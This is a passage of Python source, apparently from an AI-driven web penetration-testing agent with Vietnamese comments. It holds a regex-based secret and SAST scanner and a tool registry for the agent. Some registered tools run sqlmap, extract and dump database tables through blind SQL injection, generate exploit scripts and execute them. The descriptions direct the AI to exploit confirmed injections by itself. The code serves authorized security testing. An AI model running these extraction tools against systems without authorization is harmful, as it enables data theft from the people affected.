    ("JWT token", "medium", re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"), "JWT hardcode — kiểm tra secret bên trong"),
    ("Credential trong URL", "medium", re.compile(r"\b[a-zA-Z0-9_-]+:[^@\s/]{3,}@"), "user:pass@ trong URL"),
]


def _sast_scan(**kw):
    src = os.path.abspath(os.path.expanduser(kw["src_path"]))
    if not os.path.exists(src):
        return f"[!] Src không tồn tại: {src}"
    langs_want = [l.lower() for l in (kw.get("languages") or []) if l.lower() in SAST_PATTERNS]
    engine = (kw.get("engine") or "patterns").lower()
    max_findings = max(1, min(int(kw.get("max_findings", 150)), 1000))

    files = []
    if os.path.isfile(src):
        files.append(src)
    else:
        for root, dirs, names in os.walk(src):
            dirs[:] = [d for d in dirs if d not in SKIP_SCAN_DIRS]
            for n in names:
                if n.endswith(tuple(SKIP_SCAN_EXTS)):
                    continue
                files.append(os.path.join(root, n))
                if len(files) >= 20000:
                    break

    findings: list[tuple] = []
    total_hits = 0
    skipped_large = 0
    lang_counts: dict[str, int] = {}
    for path in files:
        try:
            with open(path, "rb") as f:
                if b"\x00" in f.read(8192):
                    continue  # binary
            size = os.path.getsize(path)
            if size > 262144:
                skipped_large += 1
            with open(path, "r", errors="replace") as f:
                lines = f.readlines(262144)
        except (OSError, UnicodeDecodeError):
            continue
        ext = os.path.splitext(path)[1].lower()
        lang = next((l for l, exts in LANG_EXT.items() if ext in exts), None)
        if lang:
            lang_counts[lang] = lang_counts.get(lang, 0) + 1
        pats = SAST_PATTERNS.get(lang, []) if lang and (not langs_want or lang in langs_want) else []
        for lineno, line in enumerate(lines, 1):
            if len(line) > 1000:
                continue
            for name, sev, rx, hint in pats:
                if rx.search(line):
                    total_hits += 1
                    if len(findings) < max_findings:
                        findings.append((sev, path, lineno, name, hint, line.strip()[:160]))
            for name, sev, rx, hint in SECRET_PATTERNS:
                m = rx.search(line)
                if not m:
                    continue
                if name == "Hardcoded credential" and not _looks_secret(m.group(0)):
                    continue
                total_hits += 1
                if len(findings) < max_findings:
                    findings.append((sev, path, lineno, name, hint, line.strip()[:160]))

    sev_rank = {"critical": 0, "high": 1, "medium": 2}
    findings.sort(key=lambda x: (sev_rank.get(x[0], 9), x[2], x[1]))
    relbase = src if os.path.isdir(src) else os.path.dirname(src)
    out = [
        f"[i] SAST scan: {src}",
        f"[i] Files={len(files)} (bỏ {skipped_large} file >256KB, bỏ binary) | "
        f"Hits={total_hits} | hiện {min(len(findings), max_findings)}/{max_findings}",
    ]
    if lang_counts:
        out.append("[i] Ngôn ngữ: " + ", ".join(f"{k}:{v}" for k, v in sorted(lang_counts.items())))
    if not findings:
        out.append("[*] Không khớp pattern nào — KHÔNG có nghĩa là sạch (pattern heuristic, không dataflow).")
    for sev, path, lineno, name, hint, snippet in findings:
        rel = os.path.relpath(path, relbase)
        out.append(f"[{sev.upper()}] {rel}:{lineno} — {name} | {hint}\n    {snippet}")
    if engine in ("semgrep", "auto") and shutil.which("semgrep"):
        out.append("\n── semgrep (p/security-audit) ──\n" + _semgrep_scan(src))
    elif engine == "semgrep":
        out.append("\n[semgrep] chưa cài → sudo apt install -y semgrep")
    if engine in ("gitleaks", "auto") and shutil.which("gitleaks"):
        out.append("\n── gitleaks ──\n" + _gitleaks_scan(src))
    elif engine == "gitleaks":
        out.append("\n[gitleaks] chưa cài → pipx install gitleaks")
    secret_names = {item[0] for item in SECRET_PATTERNS}
    structured = []
    for sev, path, lineno, name, hint, snippet in findings:
        params = set(re.findall(
            r"(?:GET|POST|REQUEST|COOKIE)\s*\[\s*['\"]([^'\"]+)|"
            r"(?:args|form|json|query|body|params)(?:\.get)?\s*\(?\s*['\"]?([A-Za-z_][\w-]*)",
            snippet, re.I))
        flat_params = sorted({value for pair in params for value in pair if value})
        route_match = re.search(r"['\"](/(?:api/)?[A-Za-z0-9_./{}:-]+)(?:\s|['\"])", snippet)
        rel = os.path.relpath(path, relbase)
        structured.append({
            "finding_id": hashlib.sha256(
                f"{rel}:{lineno}:{name}".encode()).hexdigest()[:16],
            "name": name, "severity": sev, "category": _sast_category(name),
            "file": rel, "line": lineno, "hint": hint,
            "parameters": flat_params,
            "route": route_match.group(1) if route_match else "",
            "snippet_sha256": hashlib.sha256(snippet.encode()).hexdigest(),
            "secret": name in secret_names,
        })
    data = {"src_path": src, "files_scanned": len(files), "total_hits": total_hits,
            "truncated": total_hits > len(findings), "languages": lang_counts,
            "findings": structured}
    return "\n".join(out), data


def _sast_category(name: str) -> str:
    value = (name or "").lower()
    for marker, category in (("sql", "sqli"), ("xss", "xss"),
                             ("command", "command_injection"), ("rce", "rce"),
                             ("ssrf", "ssrf"), ("lfi", "path_traversal"),
                             ("file", "path_traversal"),
                             ("deserial", "deserialization"), ("ssti", "ssti"),
                             ("upload", "file_upload")):
        if marker in value:
            return category
    return "other"


def _semgrep_scan(src: str) -> str:
    try:
        r = subprocess.run(["semgrep", "scan", "--config", "p/security-audit",
                            "--severity", "ERROR,WARNING", "--json", "--quiet", src],
                           capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return "[!] semgrep timeout 180s."
    except FileNotFoundError:
        return "[!] semgrep chưa cài."
    try:
        data = json.loads(r.stdout or "{}")
        results = data.get("results") or []
        if not results:
            return "[*] semgrep: 0 findings."
        out = [f"[semgrep] {len(results)} findings (p/security-audit, hiện 30 đầu):"]
        seen = set()
        for res in results[:60]:
            key = (res.get("path"), res.get("check_id"), (res.get("start") or {}).get("line"))
            if key in seen:
                continue
            seen.add(key)
            line = (res.get("start") or {}).get("line", "?")
            sev = ((res.get("extra") or {}).get("severity") or "?").upper()
            out.append(f"[{sev}] {res.get('path', '?')}:{line} — {res.get('check_id', '?')}")
            msg = ((res.get("extra") or {}).get("message") or "").strip().replace("\n", " ")
            if msg:
                out.append("    " + msg[:160])
        return "\n".join(out)
    except json.JSONDecodeError:
        return "[!] semgrep output không parse được."


def _gitleaks_scan(src: str) -> str:
    try:
        r = subprocess.run(["gitleaks", "dir", src, "--redact"],
                           capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return "[!] gitleaks timeout 180s."
    except FileNotFoundError:
        return "[!] gitleaks chưa cài."
    out = (r.stdout or "").strip() or (r.stderr or "").strip()
    return out[:4000] if out else "[*] gitleaks: 0 findings."


# ─────────────────────────────────────────
# TOOL REGISTRY
# ─────────────────────────────────────────────

def _zap_baseline(**kw):
    from adapters.zap import run_scan
    return run_scan(kw["_config"], kw["url"], timeout=kw.get("_timeout"),
                    auth_context=kw.get("auth_context", "anonymous"), ajax=bool(kw.get("ajax", False)))


def _zap_active_scan(**kw):
    from adapters.zap import run_scan
    return run_scan(kw["_config"], kw["url"], active=True, rule_ids=kw.get("rule_ids", []),
                    timeout=kw.get("_timeout"), auth_context=kw.get("auth_context", "anonymous"))


def _evidence_validate(**kw):
    value = kw["_evidence_store"].validate(kw["evidence_id"])
    return json.dumps(value), value


def _evidence_replay(**kw):
    value = kw["_evidence_store"].replay(kw["evidence_id"], kw["_scope_policy"], kw.get("_timeout", 15))
    return json.dumps(value), value


def _evidence_status(**kw):
    value = kw["_evidence_store"].summary()
    return json.dumps(value, ensure_ascii=False), value


TOOL_REGISTRY: list[ToolSpec] = [
    ToolSpec("zap_baseline", "Isolated ZAP spider/OpenAPI/passive scan. Alerts are candidates, not confirmed findings.",
             {"type": "object", "properties": {"url": {"type": "string"},
               "auth_context": {"type": "string", "description": "Operator-configured ZAP auth profile; anonymous by default"},
               "ajax": {"type": "boolean"}}, "required": ["url"]}, _zap_baseline, risk="noisy"),
    ToolSpec("zap_active_scan", "Targeted ZAP active scan with explicit operator-allowed rule IDs and time budget.",
             {"type": "object", "properties": {"url": {"type": "string"},
               "request_id": {"type": "string"}, "method": {"type": "string"},
               "auth_context": {"type": "string"},
               "rule_ids": {"type": "array", "items": {"type": "integer"}}},
               "required": ["url", "rule_ids"]}, _zap_active_scan, risk="active"),
    ToolSpec("evidence_validate", "Validate stored evidence with deterministic rules. Unsupported checks remain needs_validation.",
             {"type": "object", "properties": {"evidence_id": {"type": "string"}},
               "required": ["evidence_id"]}, _evidence_validate, scope_params=(), risk="safe"),
    ToolSpec("evidence_replay", "Replay a captured request under the same isolated auth identity; compare facts, never auto-confirm exploitability.",
             {"type": "object", "properties": {"evidence_id": {"type": "string"}},
               "required": ["evidence_id"]}, _evidence_replay, scope_params=(), risk="active"),
    ToolSpec("evidence_status", "Read stored scanner evidence, coverage and validation states.",
             {"type": "object", "properties": {}}, _evidence_status, scope_params=(), risk="safe"),
    # ── Recon ──
    ToolSpec("http_probe", "GET một URL: trả status code, headers chọn lọc, snippet body.",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _http_probe, risk="safe"),
    # v1.8.0: adapter trên HTTP Session Engine — cookie jar theo host QUA các
    # lần gọi, query params, form/JSON/multipart/raw body, auth, redirect history,
    # timing, evidence; giữ NGUYÊN interface + output format v1.5.6.
    ToolSpec("http_request",
             "Gửi request HTTP tùy ý qua Session Engine và trả response THẬT: status, "
             "headers, body snippet, redirect chain, final_url, thời gian. "
             "method=get|post|head|put|options|patch|delete (mặc định get). Body: "
             "form (form-urlencoded dict) | json_body (JSON) | body/data (raw) | "
             "files (multipart dict, value = 'path' | ('name','path') | ('name','path','ctype')). "
             "auth=basic:user:pass | bearer:token | api_key:name:value | apiquery:name:value. "
             "Có params (query), headers, cookies, follow_redirects (mặc định true). "
             "SESSION: cookie jar chia theo host, HIỆU LỰC trong cả phiên chạy — dùng "
             "cho authenticated testing (login rồi gọi tiếp). Dùng để TỰ phân tích lỗ "
             "hổng (quote-differential, error-based, timing, XSS reflection, SSTI, path "
             "traversal...) — không cần binary ngoài. "
             "MỌI finding phải dựa trên ít nhất 1 response http_request thật.",
             {"type": "object",
              "properties": {
                  "url": {"type": "string", "pattern": "^https?://"},
                  "method": {"type": "string", "enum": ["get", "post", "head", "put", "options", "patch", "delete"],
                              "description": "get (mặc định), post, head, put, options, patch, delete"},
                  "headers": {"type": "object",
                               "description": "Headers tùy chọn (dict, vd {'X-Custom': '1'})"},
                  "params": {"type": "object",
                              "description": "Query params (dict, vd {'id': '9'}) — cộng vào URL"},
                  "body": {"type": "string", "description": "Raw body cho post/put/patch/delete"},
                  "data": {"type": "string",
                            "description": "Alias của body (raw) — giữ tương thích v1.5.6"},
                  "json_body": {"type": "object",
                                 "description": "Body JSON (dict/list) — gửi Content-Type: application/json"},
                  "form": {"type": "object",
                            "description": "Body form-urlencoded (dict) cho post/put/patch"},
                  "files": {"type": "object",
                             "description": "Multipart upload (dict field → 'path' hoặc tuple) — chỉ post/put/patch"},
                  "auth": {"type": "string",
                            "description": "basic:user:pass | bearer:token | api_key:name:value | apiquery:name:value"},
                  "cookies": {"type": "object",
                               "description": "Cookie gửi kèm request này (dict); cookie jar host vẫn hoạt động"},
                  "follow_redirects": {"type": "boolean",
                                        "description": "Theo redirect (mặc định true); false để xem 30x + Location"}},
              "required": ["url"]},
             _http_request, risk="active"),

    # v1.9.0: crawler GET-only trên Session Engine — link/form/param/script/
    # js-hint discovery, bounded (depth/pages/body/time_budget), redirect ra
    # ngoài scope không theo. record=False — không làm ô nhiễm evidence ring.
    ToolSpec("dynamic_plan",
             "Phase 3 deterministic re-planner: reads current inventory, test history, capabilities and correlations; returns prioritized planned/blocked/completed actions without executing them.",
             {"type": "object", "properties": {
                 "goal": {"type": "string", "enum": ["coverage", "authorization", "business_logic", "sast_dast"]},
                 "max_actions": {"type": "integer", "minimum": 1, "maximum": 50}}},
             _dynamic_plan, risk="safe"),
    ToolSpec("authorization_reason",
             "Build evidence-bound authorization hypotheses from auth_compare observations. Optional declared owner/policy strengthens reasoning. Never returns a vulnerability verdict.",
             {"type": "object", "properties": {
                 "url": {"type": "string", "pattern": "^https?://"},
                 "resource_owner": {"type": "string"},
                 "expected_allowed_contexts": {"type": "array",
                     "items": {"type": "string"}}}},
             _authorization_reason, risk="safe"),
    ToolSpec("business_rule_set",
             "Declare a business invariant before testing: required_before, max_successes, numeric_bound, or state_transition. Declaration is policy input, not evidence.",
             {"type": "object", "properties": {
                 "workflow": {"type": "string"},
                 "rule": {"type": "object", "properties": {
                     "type": {"type": "string", "enum": ["required_before", "max_successes", "numeric_bound", "state_transition"]},
                     "before": {"type": "string"}, "action": {"type": "string"},
                     "field": {"type": "string"}, "min": {"type": "number"},
                     "max": {"type": "number"},
                     "allowed": {"type": "array", "items": {"type": "array", "minItems": 2, "maxItems": 2}}},
                    "required": ["type"]}}, "required": ["workflow", "rule"]},
             _business_rule_set, risk="safe"),
    ToolSpec("business_workflow_test",
             "Execute a bounded sequence of real requests through one configured auth context and record evidence for declared business rules. Does not invent state changes or verdicts.",
             {"type": "object", "properties": {
                 "workflow": {"type": "string"}, "context": {"type": "string"},
                 "steps": {"type": "array", "minItems": 1, "maxItems": 20,
                     "items": {"type": "object", "properties": {
                         "action": {"type": "string"}, "resource": {"type": "string"},
                         "inputs": {"type": "object"}, "from_state": {"type": "string"},
                         "to_state": {"type": "string"}, "request": {"type": "object"}},
                         "required": ["action", "request"]}}},
              "required": ["workflow", "context", "steps"]},
             _business_workflow_test, risk="active"),
    ToolSpec("business_reason",
             "Evaluate actual workflow observations against previously declared invariants and emit hypotheses plus evidence gaps; never a confirmed verdict.",
             {"type": "object", "properties": {"workflow": {"type": "string"}},
              "required": ["workflow"]}, _business_reason, risk="safe"),
    ToolSpec("sast_dast_correlate",
             "Correlate structured SAST sinks with discovered API operations by route/parameter/category and return bounded validation leads. SAST alone never confirms exploitability.",
             {"type": "object", "properties": {
                 "max_results": {"type": "integer", "minimum": 1, "maximum": 200}}},
             _sast_dast_correlate, risk="safe"),
    ToolSpec("phase3_status", "Show bound Phase 3 planning/reasoning/correlation state.",
             {"type": "object", "properties": {}}, _phase3_status, risk="safe"),
    ToolSpec("auth_context_set",
             "Tạo auth context có HTTP session/cookie jar riêng. Giá trị bí mật nên dùng env:TEN_BIEN. login_steps hỗ trợ request tuần tự và extract cookie/header/json/body_regex. Không gửi request cho tới auth_login/auth_compare.",
             {"type": "object", "properties": {
                 "name": {"type": "string", "pattern": "^[A-Za-z][A-Za-z0-9_.-]{0,63}$"},
                 "origin": {"type": "string", "pattern": "^https?://"},
                 "transport": {"type": "object", "description": "auth string và/hoặc headers/cookies/params; secret có thể là env:NAME"},
                 "login_steps": {"type": "array", "maxItems": 12,
                                  "items": {"type": "object"}},
                 "logout_step": {"type": "object"},
                 "replace": {"type": "boolean"}},
              "required": ["name", "origin"]}, _auth_context_set,
             scope_params=("origin",), risk="safe"),
    ToolSpec("auth_context_list", "Liệt kê auth context và lifecycle state; không lộ secret.",
             {"type": "object", "properties": {}}, _auth_context_list, risk="safe"),
    ToolSpec("auth_login", "Chạy login flow đã cấu hình trong session riêng của context.",
             {"type": "object", "properties": {"name": {"type": "string"}},
              "required": ["name"]}, _auth_login, risk="active"),
    ToolSpec("auth_logout", "Chạy logout step nếu có rồi xóa cookie/session/biến trích xuất của context.",
             {"type": "object", "properties": {"name": {"type": "string"}},
              "required": ["name"]}, _auth_logout, risk="active"),
    ToolSpec("auth_context_remove", "Xóa một auth context và session của nó.",
             {"type": "object", "properties": {"name": {"type": "string"}},
              "required": ["name"]}, _auth_context_remove, risk="safe"),
    ToolSpec("auth_compare",
             "Gửi cùng một request qua 2-8 auth context cô lập và ghi structured status/redirect/shape/hash/similarity evidence. Chỉ facts, không tự kết luận IDOR/BOLA.",
             {"type": "object", "properties": {
                 "contexts": {"type": "array", "minItems": 2, "maxItems": 8,
                              "items": {"type": "string"}},
                 "request": {"type": "object", "properties": {
                     "method": {"type": "string", "enum": ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]},
                     "url": {"type": "string", "pattern": "^https?://"},
                     "headers": {"type": "object"}, "params": {"type": "object"},
                     "cookies": {"type": "object"}, "form": {"type": "object"},
                     "json": {}, "body": {"type": "string"},
                     "follow_redirects": {"type": "boolean"},
                     "timeout": {"type": "number", "minimum": 0.1, "maximum": 60}},
                    "required": ["url"]}},
              "required": ["contexts", "request"]}, _auth_compare, risk="active"),
    ToolSpec("api_discovery", "GET-only same-origin OpenAPI/Swagger discovery, JSON observation and GraphQL hints. No auth testing or introspection.",
             {"type": "object", "properties": {
                 "url": {"type": "string", "pattern": "^https?://"},
                 "max_requests": {"type": "integer", "minimum": 1, "maximum": 100}},
              "required": ["url"]}, _api_discovery, risk="safe"),
    ToolSpec("api_import", "Import provided OpenAPI/Swagger JSON/YAML or Postman collection text without executing requests. URL is the document location and scope origin. External references are not fetched.",
             {"type": "object", "properties": {
                 "url": {"type": "string", "pattern": "^https?://"},
                 "document": {"type": "string"}}, "required": ["url", "document"]},
             _api_import, risk="safe"),
    ToolSpec("crawler",
             "BFS crawl GET-only một website (dùng CHUNG Session Engine, không "
             "submit form, không chạy exploit): khám phá link nội bộ, external "
             "link, form (action/method/field name), query parameter, script src, "
             "và endpoint hint trong JS (fetch/axios/$.ajax/XHR — CHỈ LÀ ỨNG VIÊN, "
             "cần xác minh). Bounded: max_depth BFS, max_pages, request_timeout, "
             "time_budget tự dừng. Redirect: theo tối đa 5 hop trong scope; ra "
             "ngoài scope thì dừng và ghi. Kết quả tự vào inventory (endpoint "
             "canonical /x?id={value}, parameter, form, script, JS-hint source "
             "'crawler:js'). Dùng SAU http_probe/headers_recon khi đã có base URL.",
             {"type": "object",
              "properties": {
                  "url": {"type": "string", "pattern": "^https?://",
                           "description": "Start URL (cùng scheme+host+port = scope crawl)"},
                  "max_depth": {"type": "integer", "minimum": 0, "maximum": 10,
                                 "description": "Độ sâu BFS tối đa (mặc định 3)"},
                  "max_pages": {"type": "integer", "minimum": 1, "maximum": 500,
                                 "description": "Tối đa trang sẽ GET (mặc định 100)"},
                  "same_scope": {"type": "boolean",
                                  "description": "Chỉ crawl cùng scheme+host+port (mặc định true)"},
                  "request_timeout": {"type": "number", "minimum": 1, "maximum": 60,
                                       "description": "Timeout mỗi request (giây, mặc định 30)"}},
              "required": ["url"]},
             _crawl, risk="safe"),
    ToolSpec("dns_lookup", "Tra cứu DNS A records của domain.",
             {"type": "object", "properties": {"host": {"type": "string"}},
              "required": ["host"]}, _dns_lookup, risk="safe"),
    ToolSpec("headers_recon", "HEAD request: toàn bộ response headers (server, cookies, security headers).",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _headers_recon, risk="safe"),
    ToolSpec("waf_detect", "Phát hiện WAF/CDN bằng wafw00f.",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _waf_detect, risk="safe"),
    ToolSpec("detect_cms", "Fingerprint công nghệ web bằng whatweb (CMS, framework, version).",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _detect_cms, risk="safe"),
    ToolSpec("subdomain_enum", "Enumerate subdomain bằng subfinder.",
             {"type": "object", "properties": {"domain": {"type": "string"}},
              "required": ["domain"]}, _subdomain_enum, risk="safe"),
    ToolSpec("param_discovery", "Tìm tham số ẩn trên endpoint bằng arjun.",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _param_discovery, risk="noisy"),

    # ── Active ──
    ToolSpec("sql_error_verify", "Repeat fresh captured control/payload pairs for an SQL error candidate.",
             {"type":"object", "properties":{"url":{"type":"string"}, "parameter":{"type":"string"},
              "evidence_id":{"type":"string"}}, "required":["url","parameter","evidence_id"]},
             _sql_error_verify, risk="active"),
    ToolSpec("nuclei_scan", "Quét lỗ hổng bằng nuclei templates (CVE, misconfig, exposures). "
             "Severity: critical,high,medium,low. Tags ví dụ: cve,rce,sqli,lfi.",
             {"type": "object",
              "properties": {"url": {"type": "string", "pattern": "^https?://"},
                             "severity": {"type": "string"},
                             "tags": {"type": "string"}},
              "required": ["url"]}, _nuclei_scan, risk="active"),
    ToolSpec("ffuf_dir", "Fuzz thư mục/file với ffuf (SecLists common.txt).",
             {"type": "object",
              "properties": {"url": {"type": "string", "pattern": "^https?://"},
                             "wordlist": {"type": "string"},
                             "extensions": {"type": "string"}},
              "required": ["url"]}, _ffuf_dir, risk="active"),
    ToolSpec("sqlmap_check", "Chạy sqlmap tự động (--batch --smart --current-user --banner).",
             {"type": "object",
              "properties": {"url": {"type": "string", "pattern": "^https?://"},
                             "data": {"type": "string"}},
              "required": ["url"]}, _sqlmap_check, risk="active"),
    ToolSpec("sqlmap_runner",
             "v1.4.7: chạy sqlmap BOUNDED (--technique, --level 1 --risk 1 --threads 1 "
             "--timeout 15 --retries 1 --flush-session) — BƯỚC ĐẦU của pipeline khai "
             "thác SQLi SAU KHI đã CONFIRMED (sqli_manual_test/sqli_blind_extract detect). "
             "Trích xuất version/database/tables nhanh hơn sqli_blind_extract nhiều lần. "
             "Nếu oracle trả 500 parse-error (vd template CONTAINS hấp thụ payload) thì "
             "dùng technique='E' (error-based) hoặc 'T' (time-based). Nếu sqlmap không ra "
             "dấu hiệu 'is vulnerable' → ghi nhận và sang bước thay thế, KHÔNG gọi lại "
             "cùng url (sẽ bị blocked).",
             {"type": "object",
              "properties": {
                  "url": {"type": "string", "pattern": "^https?://"},
                  "technique": {"type": "string", "pattern": "^[BEUSTQ]+$",
                                 "description": "Kỹ thuật sqlmap: B=boolean, E=error, U=union, S=stacked, T=time, Q=inline query (mặc định BEUSTQ)"},
                  "dbms": {"type": "string", "enum": ["mssql", "mysql", "auto"],
                            "description": "DB engine (mặc định auto → bỏ --dbms)"},
                  "data": {"type": "string",
                            "description": "POST body khi SQLi nằm ở form, vd 'keyword=abc'"},
                  "cookie": {"type": "string",
                              "description": "Session cookie khi cần xác thực"},
                  "timeout": {"type": "integer", "minimum": 30, "maximum": 600,
                               "description": "Giây tối đa cho lần chạy (mặc định 240)"}},
              "required": ["url"]},
             _sqlmap_runner, risk="active"),
    ToolSpec("sqli_manual_test", "Test SQLi thủ công: phát hiện quote-differential (error-based) qua test'/test'' "
             "rồi fallback time-based (SLEEP cho mysql, WAITFOR DELAY cho mssql). "
             "Hỗ trợ GET (?param=payload) VÀ POST (method='post' + data='q=test'). "
             "engine=mysql|mssql|auto (auto đoán qua headers). Không cần baseline/delay_payload "
             "— tool tự đo. Tham số/form lấy từ wapiti_scan (mục SQLi + parameter) hoặc http_probe.",
             {"type": "object",
              "properties": {"url": {"type": "string", "pattern": "^https?://"},
                             "param": {"type": "string",
                                        "description": "Tham số cần test (vd q hoặc keyword)"},
                             "method": {"type": "string", "enum": ["get", "post"],
                                         "description": "get (mặc định) hoặc post"},
                             "data": {"type": "string",
                                       "description": "Form data khi method=post, vd 'q=test' (tham số trùng param sẽ bị inject)"},
                             "engine": {"type": "string", "enum": ["mysql", "mssql", "auto"],
                                         "description": "DB engine: mysql (SLEEP), mssql (WAITFOR DELAY), auto đoán qua headers (mặc định)"},
                             "delay": {"type": "number", "minimum": 1,
                                        "description": "Giây sleep cho time-based payload (mặc định 3)"}},
              "required": ["url", "param"]}, _sqli_manual_test, risk="active"),
    ToolSpec("sqli_blind_extract",
             "SQLi time-based blind KHÔNG sqlmap: detect & extract dữ liệu bằng Python thuần "
             "(requests + timing + binary search). Hỗ trợ query (?id=1), path injection "
             "(/search/123.html) VÀ POST form (method='post' + param + data='keyword=...'). "
             "Dùng KHI sqlmap fail hoặc không bắt được path/POST-injection. "
             "engine=mssql → error-based oracle (đọc giá trị từ lỗi 500 conversion) "
             "ưu tiên trước time-based. "
             "action=detect|version|database|user|tables|dump (tables cần --db-name tùy chọn; "
             "dump cần table + columns). Extraction chậm (~10 request/ký tự) — delay nhỏ cho "
             "nhanh, lớn cho chắc chắn.",
             {"type": "object",
              "properties": {
                  "url": {"type": "string", "pattern": "^https?://"},
                  "action": {"type": "string",
                              "enum": ["detect", "version", "database", "user", "tables", "dump"],
                              "description": "detect=chỉ xác nhận lỗ hổng; dump cần table+columns"},
                  "db_name": {"type": "string", "description": "DB name cho tables (mặc định dùng DATABASE())"},
                  "table": {"type": "string", "description": "Bảng để dump (action=dump)"},
                  "columns": {"type": "string", "description": "Cột, phân tách bằng dấu phẩy (action=dump)"},
                  "limit": {"type": "integer", "minimum": 1, "maximum": 50,
                             "description": "Số dòng tối đa khi dump"},
                  "delay": {"type": "number", "minimum": 0.5,
                             "description": "Giây SLEEP mỗi probe (mặc định 3)"},
                  "threshold": {"type": "number", "minimum": 0.7,
                                 "description": "Ngưỡng delta giây để tính TRUE (mặc định 2.5)"},
                  "max_len": {"type": "integer", "minimum": 1, "maximum": 500,
                               "description": "Độ dài tối đa của mỗi giá trị trích xuất"},
                  "engine": {"type": "string", "enum": ["mysql", "mssql", "auto"],
                              "description": "DB engine: mysql (SLEEP, mặc định), mssql (error-based oracle ưu tiên + WAITFOR DELAY) hoặc auto (đoán từ response headers — mặc định mysql khi không có tín hiệu)"},
                  "method": {"type": "string", "enum": ["get", "post"],
                              "description": "get (mặc định) hoặc post (form — cần param + data)"},
                  "param": {"type": "string",
                            "description": "Tham số/field cần inject (mặc định tự tìm; POST bắt buộc truyền, vd 'keyword')"},
                  "data": {"type": "string",
                           "description": "Form data khi method=post, vd 'keyword=tin+tuc'"},
                  "known_confirmed": {"type": "boolean",
                                       "description": "true khi lỗi đã xác nhận ở phiên trước (sqli_manual_test CONFIRMED) — bỏ qua lưới 9 probe quote/comment, xác nhận ngay sau baseline"}},
              "required": ["url"]},
             _sqli_blind_extract, risk="active"),
    ToolSpec("generate_poc",
             "Sinh POC Python khai thác SQLi time-based blind KHÔNG sqlmap "
             "(requests + SLEEP + binary search ASCII). Trả về poc_path (file tạm "
             "/tmp/aixsec-x_poc_*.py) + snippet 25 dòng (code ~6KB vượt context cap nên "
             "không trả inline). Dùng trong pipeline fallback khi sqlmap_check fail: "
             "sqli_blind_extract detect → generate_poc → poc_executor. "
             "mode=query (?id=1) | path (/search/123.html — tự giữ suffix .html khi inject). "
             "action=detect|extract (VERSION+DATABASE)|dump (cần table+columns). "
             "include_user/include_tables thêm USER()/danh sách bảng. "
             "Sau khi sinh phải GỌI poc_executor với poc_path để chạy.",
             {"type": "object",
              "properties": {
                  "url": {"type": "string", "pattern": "^https?://"},
                  "mode": {"type": "string", "enum": ["query", "path"],
                            "description": "Vị trí inject: query param số hoặc path segment số"},
                  "action": {"type": "string", "enum": ["detect", "extract", "dump"],
                              "description": "detect=chỉ xác nhận; extract=version+database; dump cần table+columns"},
                  "delay": {"type": "number", "minimum": 0.5,
                             "description": "Giây SLEEP mỗi probe (mặc định 3)"},
                  "threshold": {"type": "number", "minimum": 0.7,
                                 "description": "Ngưỡng delta giây để tính TRUE (mặc định 2.5)"},
                  "table": {"type": "string", "description": "Bảng dump khi action=dump"},
                  "columns": {"type": "string",
                               "description": "Cột dump, phân tách phẩy, khi action=dump"},
                  "include_user": {"type": "boolean", "description": "Thêm USER() vào action=extract"},
                  "include_tables": {"type": "boolean", "description": "Liệt kê bảng vào action=extract"},
                  "limit": {"type": "integer", "minimum": 1, "maximum": 50,
                             "description": "Số dòng tối đa khi dump"}},
              "required": ["url"]},
             _generate_poc, risk="safe"),
    ToolSpec("poc_executor",
             "Chạy POC Python do generate_poc sinh ra. Nhận poc_path (file aixsec-x_poc_*.py "
             "trong tempdir — validate chặt chống arbitrary file exec) hoặc poc_code "
             "(source ngắn tự viết). Dùng NGAY SAU generate_poc: "
             "{'poc_path': '<poc_path từ generate_poc>', 'timeout': 90}. "
             "Output = log chạy POC (detect/extract/dump).",
             {"type": "object",
              "properties": {
                  "poc_code": {"type": "string", "description": "Source POC (chỉ dùng khi code ngắn, tự viết)"},
                  "poc_path": {"type": "string", "description": "Đường dẫn tuyệt đối file POC từ generate_poc"},
                  "timeout": {"type": "integer", "minimum": 10, "maximum": 600,
                               "description": "Giây tối đa chạy POC (mặc định 120)"}},
              "required": []},
             _poc_executor, risk="active"),
    ToolSpec("nikto_scan", "Quét nikto (web server scanner, ồn).",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _nikto_scan, risk="noisy"),

    # ── WAPITI (v1.5.0) ──
    ToolSpec("wapiti_scan",
             "v1.5.5: Quét TOÀN BỘ website bằng wapiti (crawler + 29 attack module: "
             "sql/timesql, xss/permanentxss, exec, file, xxe, ssrf, ldap, crlf, redirect, "
             "backup, htaccess, buster, csrf, methods, cms, wp_enum, network_device, "
             "log4shell, spring4shell, shellshock, takeover, upload, htp, nikto, wapp, "
             "ssl, brute_login_form...). Mặc định scope=domain (cả website), max_scan_time=300s, "
             "có trần giới hạn, không chạy vô hạn. exploit=true (mặc định): SQLi CONFIRMED "
             "tự đẩy sang sqlmap_runner (sqlmap-FIRST, max 3 mục); sqlmap THẤT BẠI → "
             "AI tự khai thác bằng sqli_blind_extract (known_confirmed=true). Cuối output có "
             "mục TỔNG HỢP LỖ HỔNG — hướng khai thác + khắc phục từng category (dùng viết "
             "final JSON findings[].fix). v1.5.5: TỰ TÌM SQLi TRÊN FORM POST — chỉ cần nhập "
             "root domain (vd https://example.com), wapiti crawl + form sweep đọc session DB "
             "(--store-session) rồi test từng field form (MSSQL error-based oracle → "
             "quote-differential → time-based giới hạn) — KHÔNG cần trỏ tay vào URL form. "
             "Param phân trang (page/p/offset/...) mặc định bị --skip để module sql không "
             "đốt hết max-attack-time trên ?page=N trước khi tới form POST. Report JSON lưu "
             "/tmp làm bằng chứng. CSP/security headers/cookie flags/https-redirect là CATEGORY "
             "trong report (không phải module chạy riêng) — nằm trong phần info của scan.",
             {"type": "object",
              "properties": {
